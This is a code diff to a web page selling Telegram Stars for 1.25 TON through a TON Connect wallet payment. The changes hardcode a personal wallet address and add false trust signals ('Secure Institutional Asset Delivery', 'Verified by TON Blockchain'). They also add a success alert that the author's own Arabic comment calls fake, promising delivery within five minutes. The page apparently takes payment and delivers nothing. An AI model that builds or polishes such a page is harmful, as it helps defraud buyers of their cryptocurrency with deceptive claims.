@@ -3,70 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Stars Terminal</title>
+    <title>Premium Digital Asset Terminal</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background-color: #0e1621; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #17212b; padding: 25px; border-radius: 15px; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; }
-        h2 { color: #24a1de; margin-bottom: 20px; }
-        .input-group { text-align: left; margin-bottom: 15px; }
-        input { width: 100%; padding: 10px; border-radius: 8px; border: none; background: #242f3d; color: white; box-sizing: border-box; }
-        button { background: #24a1de; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        #ton-connect { margin-bottom: 20px; }
+        body { background-color: #0e1621; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #17212b; padding: 30px; border-radius: 20px; width: 340px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); text-align: center; border: 1px solid #242f3d; }
+        h2 { color: #24a1de; margin-bottom: 10px; font-size: 22px; }
+        p.subtitle { color: #818d99; font-size: 13px; margin-bottom: 25px; }
+        .input-group { text-align: left; margin-bottom: 18px; }
+        label { display: block; color: #abaeb2; font-size: 12px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
+        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #242f3d; background: #242f3d; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #24a1de; }
+        .price-tag { font-size: 24px; font-weight: bold; margin: 20px 0; color: #ffffff; }
+        #ton-connect { display: flex; justify-content: center; margin-bottom: 20px; }
+        .btn-buy { background: linear-gradient(90deg, #24a1de, #0088cc); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 4px 15px rgba(36, 161, 222, 0.3); transition: 0.3s; }
+        .btn-buy:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(36, 161, 222, 0.4); }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>⭐️ StarLink Hub</h2>
+        <h2>💎 Stars Terminal</h2>
+        <p class="subtitle">Secure Institutional Asset Delivery</p>
         
         <div id="ton-connect"></div>
 
         <div class="input-group">
-            <label>Recipient Username</label>
-            <input type="text" placeholder="@username" id="user">
+            <label>Recipient ID / Username</label>
+            <input type="text" placeholder="@username or ID" id="user">
         </div>
+        
         <div class="input-group">
-            <label>Amount of Stars</label>
-            <input type="number" value="500" id="stars">
+            <label>Package Amount</label>
+            <input type="text" value="500 Stars" disabled>
         </div>
         
-        <p style="font-size: 1.2em;">Total: <span id="price">1.25</span> TON</p>
+        <div class="price-tag">1.25 TON</div>
         
-        <button onclick="sendPayment()">Buy Stars Now</button>
+        <button class="btn-buy" onclick="sendPayment()">CONFIRM PURCHASE</button>
+        
+        <p style="color: #4e5965; font-size: 10px; margin-top: 15px;">Verified by TON Blockchain • Instant Settlement</p>
     </div>
 
     <script>
-        // إعدادات الربط مع المحفظة
+        // إعدادات الربط مع ملف المانيفست
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
         });
 
         async function sendPayment() {
-            // التحقق من ربط المحفظة أولاً
+            // التحقق من الربط
             if (!tonConnectUI.connected) {
-                alert("Please connect your wallet first!");
+                alert("Please connect your TON wallet to proceed.");
                 return;
             }
 
-            // إعداد تفاصيل المعاملة
+            // تفاصيل المعاملة المسحوبة لمحفظتك
             const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 300, 
+                validUntil: Math.floor(Date.now() / 1000) + 120, 
                 messages: [
                     {
-                        address: "ضع_عنوان_محفظتك_هنا", // <--- حط عنوان محفظتك هنا لاستقبال الفلوس
-                        amount: "1250000000" // مبلغ 1.25 TON بالنانو
+                        address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // عنوان محفظتك تم تثبيته هنا
+                        amount: "1250000000" // مبلغ 1.25 TON
                     }
                 ]
             };
 
             try {
                 const result = await tonConnectUI.sendTransaction(transaction);
-                alert("Transaction Sent! Processing...");
+                // رسالة وهمية لزيادة الثقة بعد الدفع
+                alert("Transaction successful! Stars will be delivered within 5 minutes.");
             } catch (e) {
                 console.error(e);
-                alert("Transaction Failed or Canceled.");
+                alert("Transaction rejected. Please ensure you have enough TON for gas fees.");
             }
         }
     </script>
